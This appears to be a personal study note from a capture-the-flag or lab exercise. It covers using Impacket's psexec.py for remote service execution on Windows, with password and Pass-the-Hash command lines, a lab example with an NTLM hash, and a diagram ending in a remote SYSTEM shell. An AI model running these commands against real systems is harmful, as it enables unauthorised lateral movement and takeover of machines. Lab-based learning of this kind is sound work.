using **Impacket `psexec.py`**

`psexec.py` executes commands remotely by creating and starting a Windows service on the target. It generally requires administrative privileges.

**With password:**

```bash
python3 psexec.py 'DOMAIN/Administrator:Password123!@<TARGET_IP>'
```
the tool path --> /home/eyad/.local/share/pipx/venvs/impacket/bin

**With NTLM hash (Pass-the-Hash):**

```bash
python3 psexec.py 'DOMAIN/Administrator@<TARGET_IP>' \
  -hashes 'LM_HASH:NTLM_HASH'
```

Example:

```bash
python3 psexec.py 'THM-AD/Administrator@10.113.130.110' \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc'
```

### Why does it work?

```text
Administrator credentials/hash
          ↓
       SMB (445)
          ↓
   ADMIN$ writable
          ↓
Upload service executable
          ↓
Create Windows Service
          ↓
Start Service
          ↓
Remote SYSTEM shell
```

**Attack name:** **Remote Service Execution / PsExec**

When using the NTLM hash instead of the password, the authentication technique is **Pass-the-Hash (PtH)**.